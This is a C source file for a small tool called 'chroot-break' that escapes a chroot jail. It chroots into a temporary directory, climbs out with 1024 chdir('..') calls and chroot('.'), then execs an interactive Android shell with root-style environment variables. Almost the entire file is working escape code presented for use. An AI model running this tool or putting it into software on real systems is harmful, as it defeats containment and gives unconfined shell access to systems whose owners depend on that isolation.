// See the file "license.terms" for information on usage and redistribution of
// this file, and for a DISCLAIMER OF ALL WARRANTIES.


//---------------------------Includes----------------------------------------------//
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>


//---------------------------Defines-----------------------------------------------//
/*
** You should set NEED_FCHDIR to 1 if the chroot() on your
** system changes the working directory of the calling
** process to the same directory as the process was chroot()ed
** to.
**
** It is known that you do not need to set this value if you
** running on Solaris 2.7 and below.
**
*/
#define NEED_FCHDIR 0

#define TEMP_DIR "chrootbreak"

#define VERSION "0.1.0"

#define  PRINTF(text, ...) fprintf (stdout, text, __VA_ARGS__)
#define EPRINTF(text, ...) fprintf (stderr, text, __VA_ARGS__)
#define  PRINT(text) fprintf (stdout, text)
#define EPRINT(text) fprintf (stderr, text)



//---------------------------Enum tResult------------------------------------------//
enum tResult {
  NOERROR = 0,

  // Errors
  ERR_UNDEFINED = -1,

  // Warnings
  WRN_UNDEFINED = 1
};



//---------------------------Forward Declarations----------------------------------//
enum tResult openShell ();
void checkArguments (int argc, const char* argv[]);
void printHelp ();


//---------------------------Start Main--------------------------------------------//
/* Break out of a chroot() environment in C */
int main (int argc, const char* argv[]) {
  int x;            /* Used to move up a directory tree */
  struct stat sbuf; /* The stat() buffer */

#ifdef NEED_FCHDIR
  int dir_fd;       /* File descriptor to directory */
#endif

  checkArguments (argc, argv);

/*
** First we create the temporary directory if it doesn't exist
*/
  (void)chdir("/tmp/");

  if (stat (TEMP_DIR, &sbuf) < 0) {
    if (errno == ENOENT) {
      if (mkdir (TEMP_DIR, 0755) < 0) {
        EPRINTF ("Failed to create %s - %s\n", TEMP_DIR, strerror(errno) );
        exit(1);
      }
    } else {
      EPRINTF ("Failed to stat %s - %s\n", TEMP_DIR, strerror(errno) );
      exit(1);
    }
  } else if (!S_ISDIR (sbuf.st_mode) ) {
    EPRINTF ("Error - %s is not a directory!\n", TEMP_DIR);
    exit(1);
  }

#ifdef NEED_FCHDIR
/*
** Now we open the current working directory
**
** Note: Only required if chroot() changes the calling program's
**       working directory to the directory given to chroot().
**
*/
  if ( (dir_fd = open (".", O_RDONLY) ) < 0) {
    EPRINTF("Failed to open cwd for reading - %s\n", strerror(errno) );
    exit(1);
  }
#endif

/*
** Next we chroot() to the temporary directory
*/
  if (chroot (TEMP_DIR) < 0) {
    EPRINTF("Failed to chroot to %s - %s\n", TEMP_DIR, strerror(errno) );
    exit(1);
  }

#ifdef NEED_FCHDIR
/*
** Partially break out of the chroot by doing an fchdir()
**
** This only partially breaks out of the chroot() since whilst
** our current working directory is outside of the chroot() jail,
** our root directory is still within it. Thus anything which refers
** to "/" will refer to files under the chroot() point.
**
** Note: Only required if chroot() changes the calling program's
**       working directory to the directory given to chroot().
**
*/
  if (fchdir(dir_fd)<0) {
    EPRINTF("Failed to fchdir - %s\n", strerror(errno) );
    exit(1);
  }
  close(dir_fd);
#endif

  /*
   * Completely break out of the chroot by recursing up the directory
   * tree and doing a chroot to the current working directory (which will
   * be the real "/" at that point). We just do a chdir("..") lots of
   * times (1024 times for luck :). If we hit the real root directory before
   * we have finished the loop below it doesn't matter as .. in the root
   * directory is the same as . in the root.
   *
   * We do the final break out by doing a chroot(".") which sets the root
   * directory to the current working directory - at this point the real
   * root directory.
   */

  for(x=0;x<1024;x++) {
    (void)chdir("..");
  }//end for

  (void)chroot(".");

  /*
   * We're finally out - so exec a shell in interactive mode
   */

  return openShell ();
}//end Main



//---------------------------Start openShell---------------------------------------//
enum tResult openShell () {
  //setenv("PS1", "$(precmd)$USER@$HOSTNAME:${PWD:-?} ", 1);

  setenv("TERM", "linux", 1);
  setenv("PATH", "/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin", 1);
  setenv("LD_LIBRARY_PATH", "/vendor/lib:/system/lib", 1);
  setenv("ANDROID_BOOTLOGO", "1", 1);
  setenv("ANDROID_PROPERTY_WORKSPACE", "8,65536", 1);
  setenv("LOOP_MOUNTPOINT", "/mnt/obb", 1);
  setenv("EXTERNAL_STORAGE", "/mnt/sdcard", 1);
  setenv("USER", "root", 1);
  setenv("ANDROID_DATA", "/data", 1);
  setenv("SD_EXT_DIRECTORY", "/sd-ext", 1);
  setenv("MKSH", "/system/bin/sh", 1);
  setenv("HOME", "/data", 1);
  setenv("ASEC_MOUNTPOINT", "/mnt/asec", 1);
  setenv("HOSTNAME", "android", 1);
  setenv("BOOTCLASSPATH", "/system/framework/core.jar:/system/framework/core-junit.jar:/system/framework/bouncycastle.jar:/system/framework/ext.jar:/system/framework/framework.jar:/system/framework/android.policy.jar:/system/framework/services.jar:/system/framework/apache-xml.jar:/system/framework/filterfw.jar", 1);
  setenv("ANDROID_ROOT", "/system", 1);
  setenv("SHEL", "/system/bin/sh", 1);
  setenv("ANDROID_ASSETS", "/system/app", 1);
  setenv("ANDROID_SOCKET_zygote", "9", 1);
  unsetenv("TMUX");

  if (execl ("/system/bin/sh", "-l -i", NULL) < 0) {
    EPRINTF("Failed to exec - %s\n", strerror(errno) );
    return ERR_UNDEFINED;   //TODO: Set a better error value
  }

  return NOERROR;
}//end Fct



//---------------------------Start checkArguments----------------------------------//
void checkArguments (int argc, const char* argv[]) {
  if (argc <= 1)
    return;

  if (!strncmp (argv[1], "-h", 3) || !strncmp (argv[1], "--help", 7) ) {
    printHelp ();
    exit (0);
  }
}//end Fct



//---------------------------Start printHelp---------------------------------------//
void printHelp () {
  PRINT ("chroot-break " VERSION "v\n");
  PRINT ("Break out of a chroot environment\n");
}//end Fct

